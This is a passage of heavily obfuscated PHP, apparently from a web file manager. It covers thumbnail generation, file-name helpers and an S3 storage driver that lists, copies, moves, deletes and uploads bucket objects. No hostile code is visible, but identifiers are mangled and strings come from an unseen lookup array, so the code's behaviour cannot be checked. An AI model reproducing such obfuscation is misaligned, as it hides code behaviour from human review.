"\x63\x6f\166\145\x72\x5f{$…¯¬ôÌİ}\137{$ÛÕ€ø¦¢}\x2e\x70\156\x67"; $ÂûıÖÆ = IO_PATH_SYSTEM_TEMP . $—ì¯“ìö[189]; $öÓ³¡…à = IO::infoFullSimple($ÂûıÖÆ); $Ğêô‹ö = $öÓ³¡…à && is_array($öÓ³¡…à) ? $öÓ³¡…à[$—ì¯“ìö[87]] : $—ì¯“ìö[12]; if (!$Ğêô‹ö) { $Ğêô‹ö = IO::mkdir($ÂûıÖÆ); } if ($×ÍİÚú[$—ì¯“ìö[190]] == $—ì¯“ìö[191] && isset($×ÍİÚú[$—ì¯“ìö[192]]) && $×ÍİÚú[$—ì¯“ìö[192]] == kodIO::sourceID($Ğêô‹ö)) { $âÓŒø½ = $×ÍİÚú[$—ì¯“ìö[193]]; if ($ÛÕ€ø¦¢ <= 500) { $µòáö³€ = preg_replace($—ì¯“ìö[194], $—ì¯“ìö[195], $×ÍİÚú[$—ì¯“ìö[32]]); $âÓŒø½ = IO::fileNameExist($Ğêô‹ö, $µòáö³€); } return IO::fileOut(KodIO::make($âÓŒø½), !1, $×ÍİÚú[$—ì¯“ìö[32]]); } $„òˆ½ÒØ = IO::fileNameExist($Ğêô‹ö, $Ğ™øœ £); if ($„òˆ½ÒØ) { return IO::fileOut(KodIO::make($„òˆ½ÒØ), !1, $×ÍİÚú[$—ì¯“ìö[32]]); } if ($ÛÕ€ø¦¢ > 1000) { $this->makeImageCover($Ğêô‹ö, $îà¯¬“’, $Ğ™øœ £, $ÛÕ€ø¦¢); $this->makeImageCover($Ğêô‹ö, $îà¯¬“’, "\x63\x6f\x76\145\162\x5f{$…¯¬ôÌİ}\x5f\x32\x35\x30\x2e\160\x6e\147", 250); $„òˆ½ÒØ = IO::fileNameExist($Ğêô‹ö, $Ğ™øœ £); if ($„òˆ½ÒØ) { return IO::fileOut(KodIO::make($„òˆ½ÒØ), !1, $×ÍİÚú[$—ì¯“ìö[32]]); } die; } if (!kodIO::allowCover($×ÍİÚú)) { return $this->fileOut($îà¯¬“’, !1, $×ÍİÚú[$—ì¯“ìö[32]]); } $“şëÜ÷¾ = Cache::get($Ğ™øœ £); if ($“şëÜ÷¾ == $—ì¯“ìö[196] || $“şëÜ÷¾ == $—ì¯“ìö[197]) { echo $“şëÜ÷¾; die; } Cache::set($Ğ™øœ £, $—ì¯“ìö[197], 60); $€îË—ë¡ = array($Ğêô‹ö, $×ÍİÚú[$—ì¯“ìö[87]], $Ğ™øœ £, $ÛÕ€ø¦¢); $£«ÍŠÍÆ = $—ì¯“ìö[198] . $×ÍİÚú[$—ì¯“ìö[79]] . $—ì¯“ìö[199] . $Ğ™øœ £ . $—ì¯“ìö[200] . $×ÍİÚú[$—ì¯“ìö[32]] . $—ì¯“ìö[201] . $×ÍİÚú[$—ì¯“ìö[87]]; TaskQueue::add($—ì¯“ìö[202], $€îË—ë¡, $£«ÍŠÍÆ, $Ğ™øœ £); } public function makeImageCover($¾÷¯Ÿò, $©ù™Ñş», $èò½Ü‡î, $ïë¾¸‘æ) { $–çé™°¨ =& $_SERVER[ÔÕ±ĞšÎ]; if (IO::fileNameExist($¾÷¯Ÿò, $èò½Ü‡î)) { return $–çé™°¨[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ß™ğ“ÖĞ = DATA_THUMB . $èò½Ü‡î; del_file($ß™ğ“ÖĞ); $Îœñü©ª = IO::copy($©ù™Ñş», TEMP_FILES, !1, $èò½Ü‡î); if (!@file_exists($Îœñü©ª)) { return $–çé™°¨[204]; } ImageThumb::createThumb($Îœñü©ª, $ß™ğ“ÖĞ, $ïë¾¸‘æ, $ïë¾¸‘æ * 10); if (@file_exists($ß™ğ“ÖĞ)) { Cache::remove($èò½Ü‡î); return IO::move($ß™ğ“ÖĞ, $¾÷¯Ÿò); } Cache::set($èò½Ü‡î, $–çé™°¨[196], 600); del_file($ß™ğ“ÖĞ); return $–çé™°¨[205] . $Îœñü©ª . $–çé™°¨[74]; } public function fileOutImageServer($ıİ²ê¹, $²Ëšæ¤È = 250) { $this->fileOutImage($ıİ²ê¹, $²Ëšæ¤È); } public function fileNameAuto($¬™¬Ç¨Î, $á€»å¯•, $À–¯éí½ = REPEAT_RENAME, $´¶é«çü = false) { $‰ùØ’Û =& $_SERVER[ÔÕ±ĞšÎ]; $À®…’®Ú = $¬™¬Ç¨Î === $‰ùØ’Û[12] ? $á€»å¯• : rtrim($¬™¬Ç¨Î, $‰ùØ’Û[8]) . $‰ùØ’Û[8] . $á€»å¯•; if ($À–¯éí½ == REPEAT_REPLACE || !$this->exist($À®…’®Ú) || $´¶é«çü && $À–¯éí½ != REPEAT_RENAME_FOLDER) { return $á€»å¯•; } if ($À–¯éí½ == REPEAT_SKIP) { return !1; } $Æë¥–Õ­ = $‰ùØ’Û[10] . get_path_ext($á€»å¯•); $Æë¥–Õ­ = $Æë¥–Õ­ == $‰ùØ’Û[10] || $´¶é«çü ? $‰ùØ’Û[12] : $Æë¥–Õ­; $÷‚·Ğı = 1; $µş¹´ä¼ = substr($á€»å¯•, 0, strlen($á€»å¯•) - strlen($Æë¥–Õ­)); $’“ûä‡ = $µş¹´ä¼ . "\x28{$÷‚·Ğı}\51{$Æë¥–Õ­}"; while ($this->exist(rtrim($¬™¬Ç¨Î, $‰ùØ’Û[8]) . $‰ùØ’Û[8] . $’“ûä‡)) { $’“ûä‡ = $µş¹´ä¼ . "\50{$÷‚·Ğı}\51{$Æë¥–Õ­}"; $÷‚·Ğı++; } return $’“ûä‡; } private function fileNameAutoList($ùöœ¹·é, $Ë °Ğö¤, $ôÙ³ïø° = false) { $Éşáƒ÷Ù =& $_SERVER[ÔÕ±ĞšÎ]; $üû·¡à… = $this->listPath($ùöœ¹·é, !0); $üû·¡à… = array_merge($üû·¡à…[$Éşáƒ÷Ù[85]], $üû·¡à…[$Éşáƒ÷Ù[86]]); $³£•Ş³£ = array_to_keyvalue($üû·¡à…, $Éşáƒ÷Ù[12], $Éşáƒ÷Ù[32]); $®öÌáıÄ = $Éşáƒ÷Ù[10] . get_path_ext($Ë °Ğö¤); $®öÌáıÄ = $®öÌáıÄ == $Éşáƒ÷Ù[10] || $ôÙ³ïø° ? $Éşáƒ÷Ù[12] : $®öÌáıÄ; $ó°ù‰æñ = substr($Ë °Ğö¤, 0, strlen($Ë °Ğö¤) - strlen($®öÌáıÄ)); $ãªŞç¬ = $ó°ù‰æñ . "\50\x30\51{$®öÌáıÄ}"; for ($òêÁÔØœ = 1; $òêÁÔØœ <= count($³£•Ş³£) + 1; $òêÁÔØœ++) { $ãªŞç¬ = $ó°ù‰æñ . "\x28{$òêÁÔØœ}\51{$®öÌáıÄ}"; if (!in_array_not_case($ãªŞç¬, $³£•Ş³£)) { return $ãªŞç¬; } } return $ãªŞç¬; } public function listAllFiles($†ô‹Ãœ¢, $“«ÛŒâ) { $©¼”÷¯š =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($“«ÛŒâ)) { return array(); } $¹Ó³ÊÊ« = array_keys($“«ÛŒâ); $ÙÓë¦Ìæ = array(); $†ô‹Ãœ¢ = trim($†ô‹Ãœ¢, $©¼”÷¯š[8]); foreach ($“«ÛŒâ as $òá”‡© => $À·¹‚Şä) { $Í¤ğšğÑ = ltrim(substr(trim($òá”‡©, $©¼”÷¯š[8]), strlen($†ô‹Ãœ¢)), $©¼”÷¯š[8]); if (substr($òá”‡©, -1) == $©¼”÷¯š[8]) { $Í¤ğšğÑ = rtrim($Í¤ğšğÑ, $©¼”÷¯š[8]) . $©¼”÷¯š[8]; } $ÙÓë¦Ìæ = array_merge($ÙÓë¦Ìæ, $this->slicePath($Í¤ğšğÑ)); } $²é§½Â = array(); foreach (array_unique($ÙÓë¦Ìæ) as $›ªŞÒç—) { $¢Ä»Õ†  = array($©¼”÷¯š[87] => $this->getPathOuter($©¼”÷¯š[8] . $†ô‹Ãœ¢ . $©¼”÷¯š[8] . $›ªŞÒç—), $©¼”÷¯š[78] => 1, $©¼”÷¯š[79] => 0); if (substr($›ªŞÒç—, -1) != $©¼”÷¯š[8]) { $¢Ä»Õ† [$©¼”÷¯š[78]] = 0; $‡¾ï¾ÒÚ = $this->getPath($†ô‹Ãœ¢ . $©¼”÷¯š[8] . $›ªŞÒç—); if (isset($“«ÛŒâ[$‡¾ï¾ÒÚ])) { $ë½—íÌŞ = $“«ÛŒâ[$‡¾ï¾ÒÚ]; if (isset($ë½—íÌŞ[$©¼”÷¯š[79]])) { $¢Ä»Õ† [$©¼”÷¯š[79]] = intval($ë½—íÌŞ[$©¼”÷¯š[79]]); } if (isset($ë½—íÌŞ[$©¼”÷¯š[206]])) { $¢Ä»Õ† [$©¼”÷¯š[88]] = intval($ë½—íÌŞ[$©¼”÷¯š[206]]); } } } $²é§½Â[] = $¢Ä»Õ† ; } return $²é§½Â; } public function slicePath($¢¨ÒÏøò) { $ş ° á =& $_SERVER[ÔÕ±ĞšÎ]; $Æ³ÅÔêÎ = explode($ş ° á[8], trim($¢¨ÒÏøò, $ş ° á[8])); $ïşí«´ô = 0; do { ++$ïşí«´ô; $Óš£”ä÷[] = implode($ş ° á[8], array_slice($Æ³ÅÔêÎ, 0, $ïşí«´ô)) . $ş ° á[8]; } while ($ïşí«´ô < count($Æ³ÅÔêÎ)); $Óš£”ä÷[count($Æ³ÅÔêÎ) - 1] = $¢¨ÒÏøò; return $Óš£”ä÷; } public function getHost() { $ú×çÅöÛ =& $_SERVER[ÔÕ±ĞšÎ]; $Ùà“˜òœ = parse_url(trim($this->domain, $ú×çÅöÛ[8])); $©¦’€üÆ = isset($Ùà“˜òœ[$ú×çÅöÛ[207]]) ? $Ùà“˜òœ[$ú×çÅöÛ[207]] : http_type(); $ˆº¡”»¨ = isset($Ùà“˜òœ[$ú×çÅöÛ[208]]) ? $Ùà“˜òœ[$ú×çÅöÛ[208]] : $Ùà“˜òœ[$ú×çÅöÛ[87]]; if (isset($Ùà“˜òœ[$ú×çÅöÛ[209]])) { $ˆº¡”»¨ .= $ú×çÅöÛ[4] . $Ùà“˜òœ[$ú×çÅöÛ[209]]; } return $©¦’€üÆ . $ú×çÅöÛ[210] . $ˆº¡”»¨; } public function pathEncode($‚•­ı¶Ä) { $îù¼¢Á¶ =& $_SERVER[ÔÕ±ĞšÎ]; return str_replace($îù¼¢Á¶[211], $îù¼¢Á¶[8], rawurlencode($‚•­ı¶Ä)); } public function writeLog($µì²øØ” = '', $Õ…Œ§» = false) { $©ÖƒÔö¯ =& $_SERVER[ÔÕ±ĞšÎ]; $ÔÓğı¯â = in_array(ACTION, array($©ÖƒÔö¯[212], $©ÖƒÔö¯[213])); if (!$ÔÓğı¯â && !GLOBAL_DEBUG) { return; } $¤ÌÜ¦‘ = $µì²øØ”; static $íÌÃ÷ÒÕ = null; if (!$íÌÃ÷ÒÕ) { $íÌÃ÷ÒÕ = strtoupper($this->getType()); } $µì²øØ” = $íÌÃ÷ÒÕ . $©ÖƒÔö¯[214] . $µì²øØ”; if ($Õ…Œ§») { $á›º’Ê¦ = error_get_last(); if ($á›º’Ê¦) { $µì²øØ” = array($µì²øØ”, $á›º’Ê¦); } } write_log($µì²øØ”, $©ÖƒÔö¯[215]); if ($ÔÓğı¯â) { throw new Exception($¤ÌÜ¦‘); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¿Ò·õ­½) { set_timeout(); require_once SDK_DIR . $_SERVER[ÔÕ±ĞšÎ][216]; parent::__construct(); $this->_init($¿Ò·õ­½); } public function _init($œğç‚Æ’) { $†£‘Æ»´ =& $_SERVER[ÔÕ±ĞšÎ]; $this->config = $œğç‚Æ’; foreach ($œğç‚Æ’ as $Á©²†ø  => $„Ê‡¨±) { if (isset($this->{$Á©²†ø })) { $this->{$Á©²†ø } = $„Ê‡¨±; } } $this->endpoint = $œğç‚Æ’[$†£‘Æ»´[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ÁêÑ¦ë• = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ÁêÑ¦ë•, 0, 7) == $†£‘Æ»´[218]) { $ÁêÑ¦ë• = $†£‘Æ»´[219] . substr($ÁêÑ¦ë•, 7); } $this->client->setEndpoint($ÁêÑ¦ë•); if (in_array(ACTION, array($†£‘Æ»´[212], $†£‘Æ»´[213]))) { $this->client->setExceptions(); } } public function setSignVersion($¿ùº•ÑÍ = "\166\64") { $this->signVer = $¿ùº•ÑÍ; $this->client->setSignVersion($¿ùº•ÑÍ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ŞèæÌåø) { return null; } } public function isBucketCors() { $—°´úã =& $_SERVER[ÔÕ±ĞšÎ]; $µ£±æöÄ = $this->getBucketCors(); if (!$µ£±æöÄ || !is_array($µ£±æöÄ)) { return !1; } if (!is_array($µ£±æöÄ[$—°´úã[220]])) { $µ£±æöÄ[$—°´úã[220]] = explode($—°´úã[50], $µ£±æöÄ[$—°´úã[220]]); } if ($µ£±æöÄ[$—°´úã[221]] != $—°´úã[222] || !in_array($—°´úã[222], $µ£±æöÄ[$—°´úã[220]])) { return !1; } $£äêƒ…Ö = array_map($—°´úã[223], $µ£±æöÄ[$—°´úã[224]]); if (!is_array($£äêƒ…Ö)) { $£äêƒ…Ö = array(); } $ÂÀÛØ› = array($—°´úã[225], $—°´úã[226], $—°´úã[227], $—°´úã[228], $—°´úã[229]); $¶Ìì¿É = array_diff($ÂÀÛØ›, $£äêƒ…Ö); return empty($¶Ìì¿É); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ŸÄ×Áª«, $Í¸”Öñ× = '', $ „×•–Ã = REPEAT_RENAME) { $ş€ïÙó = $this->setContent($ŸÄ×Áª«, $Í¸”Öñ×); if ($ş€ïÙó !== !1) { return $this->getPathOuter($ŸÄ×Áª«); } return !1; } public function mkdir($œ•°–Ã, $ÖÏÎş = REPEAT_SKIP) { $‡‹¿›ƒê =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($œ•°–Ã) && $œ•°–Ã !== $‡‹¿›ƒê[230]) { return !1; } if ($ÖÏÎş && $this->_isFolder($œ•°–Ã)) { return $this->getPathOuter($œ•°–Ã); } $ÛªŸŸ = $this->setContent($œ•°–Ã, $‡‹¿›ƒê[12], !0); if ($ÛªŸŸ !== !1) { return $this->getPathOuter($œ•°–Ã); } return !1; } public function copyFile($£ÊééÇ•, $Ó¯É©ó, $€ñõª‰¼ = array()) { $¹‰õ¹õÕ =& $_SERVER[ÔÕ±ĞšÎ]; $‹‚²½†¹ = $this->objectMeta($£ÊééÇ•); if (!$‹‚²½†¹) { return !1; } if ($‹‚²½†¹[$¹‰õ¹õÕ[79]] <= 1024 * 1024 * 200) { $Ñ£şÉÆ = $this->client->copyObject($this->bucket, $£ÊééÇ•, $this->bucket, $Ó¯É©ó, $¹‰õ¹õÕ[231], $€ñõª‰¼); } else { $Ñ£şÉÆ = $this->client->multiCopyObject($this->bucket, $£ÊééÇ•, $this->bucket, $Ó¯É©ó, $€ñõª‰¼); } $Ñ£şÉÆ = $Ñ£şÉÆ ? $this->getPathOuter($Ó¯É©ó) : !1; return $Ñ£şÉÆ; } public function moveFile($÷¥³ÎÃË, $¸·®Çû) { if ($this->copyFile($÷¥³ÎÃË, $¸·®Çû)) { $this->delFile($÷¥³ÎÃË); return $this->getPathOuter($¸·®Çû); } return !1; } public function delFile($”¯¹‡¸Ä) { return $this->client->deleteObject($this->bucket, $”¯¹‡¸Ä); } public function delFolder($ŠäƒíĞŞ) { $È¥Ì§Éµ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->exist($ŠäƒíĞŞ)) { return !0; } $this->listItemCache = !1; $÷…æíü² = $this->fileList($ŠäƒíĞŞ); $this->listItemCache = !0; $ú­Ò£Ûˆ = trim($ŠäƒíĞŞ, $È¥Ì§Éµ[8]) . $È¥Ì§Éµ[8]; if (!empty($ŠäƒíĞŞ) && $ŠäƒíĞŞ !== $È¥Ì§Éµ[230] && !in_array($ú­Ò£Ûˆ, $÷…æíü²[$È¥Ì§Éµ[85]])) { $÷…æíü²[$È¥Ì§Éµ[85]][] = $ú­Ò£Ûˆ; } $ÀÁŞÈÚş = $this->delByBatch($÷…æíü²[$È¥Ì§Éµ[86]]); if (!$ÀÁŞÈÚş) { return !1; } $ÀÁŞÈÚş = $this->delByBatch($÷…æíü²[$È¥Ì§Éµ[85]]); if (!$ÀÁŞÈÚş) { return !1; } return $this->delFile($ú­Ò£Ûˆ); } private function delByBatch($½÷éœıÊ) { foreach (array_chunk($½÷éœıÊ, 1000) as $‹¾ÕÆı„) { $½ëâï› = $this->client->deleteObjects($this->bucket, $‹¾ÕÆı„); if (!$½ëâï›) { return !1; } } return !0; } public function rename($áåÆ‡’«, $îì¸±íá) { return $this->renameObject($áåÆ‡’«, $îì¸±íá); } public function listPath($Û„üØî°, $ø„ùû¢µ = false) { $™Ä×ñËõ =& $_SERVER[ÔÕ±ĞšÎ]; $âşï–ÌÑ = $this->fileList($Û„üØî°, $™Ä×ñËõ[8], !0); foreach ($âşï–ÌÑ[$™Ä×ñËõ[85]] as $Şš­º©ç => $—¶íµí) { $âşï–ÌÑ[$™Ä×ñËõ[85]][$Şš­º©ç] = $this->folderInfo($—¶íµí, $ø„ùû¢µ, $—¶íµí); } foreach ($âşï–ÌÑ[$™Ä×ñËõ[86]] as $Şš­º©ç => $—¶íµí) { $âşï–ÌÑ[$™Ä×ñËõ[86]][$Şš­º©ç] = $this->fileInfo($—¶íµí[$™Ä×ñËõ[32]], $ø„ùû¢µ, $—¶íµí); } return $âşï–ÌÑ; } protected function infoChildren($ã…è½Á, &$í²Ï¹šª) { $íû»œµá =& $_SERVER[ÔÕ±ĞšÎ]; $Û€ĞÆ¯ = $this->fileList($ã…è½Á, $íû»œµá[12], !0); $í²Ï¹šª[$íû»œµá[81]] += count($Û€ĞÆ¯[$íû»œµá[85]]); $í²Ï¹šª[$íû»œµá[80]] += count($Û€ĞÆ¯[$íû»œµá[86]]); foreach ($Û€ĞÆ¯[$íû»œµá[86]] as $•úƒÛŞÛ) { if (!$•úƒÛŞÛ || !$•úƒÛŞÛ[$íû»œµá[79]]) { continue; } $í²Ï¹šª[$íû»œµá[79]] += $•úƒÛŞÛ[$íû»œµá[79]]; } } private function fileInfo($¡šÄÏ‰ƒ, $ÕÍÒ½êõ = false, $‡æ†Úô› = array()) { $éŞÕ±œ =& $_SERVER[ÔÕ±ĞšÎ]; $†¾‰¥š× = array($éŞÕ±œ[32] => $this->pathThis($¡šÄÏ‰ƒ), $éŞÕ±œ[87] => $this->getPathOuter($¡šÄÏ‰ƒ), $éŞÕ±œ[33] => $éŞÕ±œ[232], $éŞÕ±œ[169] => $this->ext($¡šÄÏ‰ƒ), $éŞÕ±œ[79] => isset($‡æ†Úô›[$éŞÕ±œ[79]]) ? $‡æ†Úô›[$éŞÕ±œ[79]] : 0); if ($ÕÍÒ½êõ) { return $†¾‰¥š×; } $†¾‰¥š×[$éŞÕ±œ[233]] = $†¾‰¥š×[$éŞÕ±œ[88]] = 0; $†¾‰¥š×[$éŞÕ±œ[234]] = $†¾‰¥š×[$éŞÕ±œ[235]] = !0; if (empty($‡æ†Úô›)) { $‡æ†Úô› = $this->objectMeta($¡šÄÏ‰ƒ); if (!$‡æ†Úô›) { return $†¾‰¥š×; } } if (isset($‡æ†Úô›[$éŞÕ±œ[236]]) && $‡æ†Úô›[$éŞÕ±œ[236]]) { $†¾‰¥š×[$éŞÕ±œ[237]] = $‡æ†Úô›[$éŞÕ±œ[236]]; } if (isset($‡æ†Úô›[$éŞÕ±œ[206]])) { $†¾‰¥š×[$éŞÕ±œ[88]] = $‡æ†Úô›[$éŞÕ±œ[206]]; } if (isset($‡æ†Úô›[$éŞÕ±œ[79]])) { $†¾‰¥š×[$éŞÕ±œ[79]] = $‡æ†Úô›[$éŞÕ±œ[79]]; } return $†¾‰¥š×; } private function folderInfo($Áêıñç, $©õåÃÀÉ = false, $®’ËÙ“ = array()) { $ôÛúø”³ =& $_SERVER[ÔÕ±ĞšÎ]; $î¬®ùı = array($ôÛúø”³[32] => $this->pathThis($Áêıñç), $ôÛúø”³[87] => $this->getPathOuter($ôÛúø”³[8] . $Áêıñç), $ôÛúø”³[33] => $ôÛúø”³[78]); if ($©õåÃÀÉ) { return $î¬®ùı; } $î¬®ùı[$ôÛúø”³[233]] = $î¬®ùı[$ôÛúø”³[88]] = 0; $î¬®ùı[$ôÛúø”³[234]] = $î¬®ùı[$ôÛúø”³[235]] = !0; if ($Áêıñç == $ôÛúø”³[12]) { return $î¬®ùı; } if (empty($®’ËÙ“)) { $®’ËÙ“ = $this->objectMeta(trim($Áêıñç, $ôÛúø”³[8]) . $ôÛúø”³[8]); } if (isset($®’ËÙ“[$ôÛúø”³[206]])) { $î¬®ùı[$ôÛúø”³[233]] = $®’ËÙ“[$ôÛúø”³[206]]; } return $î¬®ùı; } private function fileList($…é‘¬†Ÿ, $©‡ÙúÛö = '', $šÕãØöÜ = 0) { $Şš¹¦š =& $_SERVER[ÔÕ±ĞšÎ]; $ı½¡ĞÉĞ = rtrim($…é‘¬†Ÿ, $Şš¹¦š[8]) . $Şš¹¦š[8]; $Ìğ¸ï” = $this->listObjs($ı½¡ĞÉĞ, null, null, $©‡ÙúÛö); if (!$Ìğ¸ï”) { return array($Şš¹¦š[85] => array(), $Şš¹¦š[86] => array()); } $Áæ¨´Ÿ£ = $ÌÁÄÏª‡ = array(); foreach ($Ìğ¸ï”[$Şš¹¦š[238]] as $ĞÑ–€×Û) { $ò§Ä¶ş‚ = $ĞÑ–€×Û[$Şš¹¦š[32]]; if ($ò§Ä¶ş‚ == $ı½¡ĞÉĞ) { continue; } $ÁöÇÎû = isset($ĞÑ–€×Û[$Şš¹¦š[79]]) ? $ĞÑ–€×Û[$Şš¹¦š[79]] : 0; $½•¶Şå = $ÁöÇÎû == 0 && substr($ò§Ä¶ş‚, strlen($ò§Ä¶ş‚) - 1, 1) == $Şš¹¦š[8] ? !0 : !1; $this->cacheMethodInfoSet($ò§Ä¶ş‚, $½•¶Şå, $ĞÑ–€×Û); if ($½•¶Şå) { $Áæ¨´Ÿ£[] = $ò§Ä¶ş‚; continue; } $ÌÁÄÏª‡[] = $šÕãØöÜ ? $ĞÑ–€×Û : $ò§Ä¶ş‚; } foreach ($Ìğ¸ï”[$Şš¹¦š[239]] as $ĞÑ–€×Û) { $Áæ¨´Ÿ£[] = $ĞÑ–€×Û[$Şš¹¦š[32]]; $this->cacheMethodInfoSet($ĞÑ–€×Û[$Şš¹¦š[32]], !0); } $this->cacheMethodInfoSet($…é‘¬†Ÿ, !0); return array($Şš¹¦š[85] => $Áæ¨´Ÿ£, $Şš¹¦š[86] => $ÌÁÄÏª‡); } private function listObjs($ÖªŸÊèà, $Åîë¬¬ş = null, $Ö†Ş€áÈ = null, $îÌü¨Œ´ = null) { $°İü€ŞÙ =& $_SERVER[ÔÕ±ĞšÎ]; $ÖªŸÊèà = trim($ÖªŸÊèà, $°İü€ŞÙ[8]); $¨ìĞªº = empty($ÖªŸÊèà) && $ÖªŸÊèà !== $°İü€ŞÙ[230] ? $°İü€ŞÙ[12] : $ÖªŸÊèà . $°İü€ŞÙ[8]; return $this->client->getBucket($this->bucket, $¨ìĞªº, $Åîë¬¬ş, $Ö†Ş€áÈ, $îÌü¨Œ´, !0); } public function has($—É¹†…é, $ú½è‡Ï€ = false, $ì§´ƒœØ = true) { $§Ã±•™ =& $_SERVER[ÔÕ±ĞšÎ]; $—É¹†…é = trim($—É¹†…é, $§Ã±•™[8]); $Ø÷šÍªÌ = empty($—É¹†…é) && $—É¹†…é !== $§Ã±•™[230] ? $§Ã±•™[12] : $—É¹†…é . $§Ã±•™[8]; $³Õ„Ğù… = null; $™½‘¹·Ï = 500; $Ğı”µÏŠ = $§Ã±•™[8]; $õ‹‡ñúù = $—¾ÇÄÅÅ = array(); while (!0) { $¿·¶õã¸ = $this->listObjs($—É¹†…é, $³Õ„Ğù…, $™½‘¹·Ï, $Ğı”µÏŠ); if (!$¿·¶õã¸) { break; } $³Õ„Ğù… = $¿·¶õã¸[$§Ã±•™[240]]; $¸¦¾ª´² = $¿·¶õã¸[$§Ã±•™[238]]; $Ä¢Äğ§° = $¿·¶õã¸[$§Ã±•™[239]]; if (empty($¸¦¾ª´²) && empty($Ä¢Äğ§°)) { break; } if (count($¸¦¾ª´²) == 1 && $¸¦¾ª´²[0][$§Ã±•™[32]] == $Ø÷šÍªÌ) { break; } if ($ú½è‡Ï€) { if (count($¸¦¾ª´²)) { $¸¦¾ª´² = array_column($¸¦¾ª´², $§Ã±•™[32]); $õ‹‡ñúù = array_merge($õ‹‡ñúù, $¸¦¾ª´²); } if (count($Ä¢Äğ§°)) { $Ä¢Äğ§° = array_column($Ä¢Äğ§°, $§Ã±•™[32]); $—¾ÇÄÅÅ = array_merge($—¾ÇÄÅÅ, $Ä¢Äğ§°); } if ($³Õ„Ğù… === null) { break; } continue; } if ($ì§´ƒœØ) { if (!empty($¸¦¾ª´²)) { if (count($¸¦¾ª´²) > 1 || isset($¸¦¾ª´²[0][$§Ã±•™[32]]) && $¸¦¾ª´²[0][$§Ã±•™[32]] != $Ø÷šÍªÌ) { return !0; } } } else { if (!empty($Ä¢Äğ§°)) { return !0; } } if ($³Õ„Ğù… === null) { break; } } if ($ú½è‡Ï€) { $õ‹‡ñúù = array_diff($õ‹‡ñúù, array($Ø÷šÍªÌ)); $õ‹‡ñúù = count(array_unique($õ‹‡ñúù)); $—¾ÇÄÅÅ = count(array_unique($—¾ÇÄÅÅ)); return array($§Ã±•™[241] => $õ‹‡ñúù, $§Ã±•™[242] => $—¾ÇÄÅÅ); } return !1; } public function listAll($¦ˆ»İ×) { $”“Íæ£Æ =& $_SERVER[ÔÕ±ĞšÎ]; $°è•Ïë = $this->fileList($¦ˆ»İ×, $”“Íæ£Æ[12], !0); $¥ã„ğó = array_to_keyvalue($°è•Ïë[$”“Íæ£Æ[86]], $”“Íæ£Æ[32]); foreach ($°è•Ïë[$”“Íæ£Æ[85]] as $¦¤°¢Òª) { if (is_string($¦¤°¢Òª)) { $¥ã„ğó[$¦¤°¢Òª] = array($”“Íæ£Æ[79] => 0); } } return $this->listAllFiles($¦ˆ»İ×, $¥ã„ğó); } public function canRead($âı¼ßå®) { $Ÿ„¤™ŞÂ =& $_SERVER[ÔÕ±ĞšÎ]; $€°¦À­ = $this->client->getAccessControlPolicy($this->bucket, $âı¼ßå®); if (!$€°¦À­) { return !1; } return in_array($€°¦À­, array($Ÿ„¤™ŞÂ[243], $Ÿ„¤™ŞÂ[244], $Ÿ„¤™ŞÂ[245])) ? !0 : !1; } public function canWrite($ê´¿ùäç) { $©¢ïÕ =& $_SERVER[ÔÕ±ĞšÎ]; $©ã‹ÊŠï = $this->client->getAccessControlPolicy($this->bucket, $ê´¿ùäç); if (!$©ã‹ÊŠï) { return !1; } return in_array($©ã‹ÊŠï, array($©¢ïÕ[243], $©¢ïÕ[244])) ? !0 : !1; } public function getContent($×¸Î¿Éæ) { return $this->client->getObject($this->bucket, $×¸Î¿Éæ); } public function setContent($òÎ³‹•Ê, $”´Æ‰ñõ = '', $Ì²œş = false) { $Ÿ‚…ªö‰ =& $_SERVER[ÔÕ±ĞšÎ]; $òÎ³‹•Ê = $Ì²œş ? trim($òÎ³‹•Ê, $Ÿ‚…ªö‰[8]) . $Ÿ‚…ªö‰[8] : $òÎ³‹•Ê; $¨ª…ìè = get_file_mime(get_path_ext($òÎ³‹•Ê)); $Ö‡œ®ô = $this->client->putObject($”´Æ‰ñõ, $this->bucket, $òÎ³‹•Ê, $Ÿ‚…ªö‰[231], array(), $¨ª…ìè); if (!$Ö‡œ®ô) { return !1; } if ($Ì²œş) { return !0; } return $Ö‡œ®ô ? !0 : !1; } public function fileSubstr($Ã¹éÕÃü, $‘½¼ú´†, $¨®ƒÉ•Ÿ) { $ºÕæ“õÃ = $‘½¼ú´† + $¨®ƒÉ•Ÿ - 1; return $this->client->getObject($this->bucket, $Ã¹éÕÃü, array($_SERVER[ÔÕ±ĞšÎ][246] => "\x62\171\x74\145\x73\x3d{$‘½¼ú´†}\55{$ºÕæ“õÃ}")); } public function upload($€öØğÛ¢, $–µÈ‹Ü¾, $ÁÁÁÌ = false, $¿’ñØÇ = REPEAT_REPLACE) { $Ş™ñïß =& $_SERVER[ÔÕ±ĞšÎ]; $Œ¨š«ô = array($Ş™ñïß[247] => @md5_file($–µÈ‹Ü¾)); $«¤®¤•Œ = array($Ş™ñïß[248] => get_file_mime(get_path_ext($€öØğÛ¢))); if (IO::size($–µÈ‹Ü¾) <= 1024 * 1024 * 200) { $ßúäÊ… = $this->client->putObjectFile($–µÈ‹Ü¾, $this->bucket, $€öØğÛ¢, $Ş™ñïß[231], $Œ¨š«ô, $«¤®¤•Œ); return !empty($ßúäÊ…) ? $this->getPathOuter($€öØğÛ¢) : !1; } $å¯”Ê”­ = $this->client->multiUploadObject($–µÈ‹Ü¾, $this->bucket, trim($€öØğÛ¢, $Ş™ñïß[8]), $Œ¨š«ô, $«¤®¤•Œ); return $å¯”Ê”­ ? $this->getPathOuter($€öØğÛ¢) : !1; } public function download($ûè¹õŞ, $ìíéºé) { if 